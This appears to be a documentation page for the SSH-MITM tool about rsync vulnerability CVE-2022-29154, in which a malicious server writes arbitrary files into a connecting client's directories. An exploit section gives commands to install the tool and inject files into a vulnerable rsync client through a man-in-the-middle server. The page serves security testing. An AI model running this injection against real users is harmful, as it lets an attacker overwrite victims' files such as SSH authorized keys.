CVE-2022-29154
==============

.. card::

    :bdg-warning:`CVSS N/A` NVD score not yet provided.
    ^^^
    An issue was discovered in rsync before 3.2.5 that allows malicious remote servers
    to write arbitrary files inside the directories of connecting peers.
    The server chooses which files/directories are sent to the client.
    However, the rsync client performs insufficient validation of file names.
    A malicious rsync server (or Man-in-The-Middle attacker) can overwrite arbitrary files in the
    rsync client target directory and subdirectories (for example, overwrite the .ssh/authorized_keys file).
    +++
    **Affected Software:**

    * rsync < 3.2.5

    :fas:`check;sd-text-success` integrated in `SSH-MITM <https://github.com/ssh-mitm/ssh-mitm/blob/develop/sshmitm/plugins/scp/CVE202229154.py>`_


Exploit
-------

This feature is currently only available in the development branch.

.. code-block::

    git clone https://github.com/ssh-mitm/ssh-mitm.git
    cd ssh-mitm
    git checkout develop
    pip install -U .

Run tthe server and add additional files to be requested:

.. code-block::

    ssh-mitm server --scp-interface CVE-2022-29154 --rsync-inject-file /bin/ls

Connect to client to the man in the middle server. Note in this example the ssh command has to be sepcified with another port.

.. code-block::

    rsync -e 'ssh -p 10022' 'user@SERVER:/bin/bash' .

If your rsync version is vulnerable you will reveive 2 files from the server.

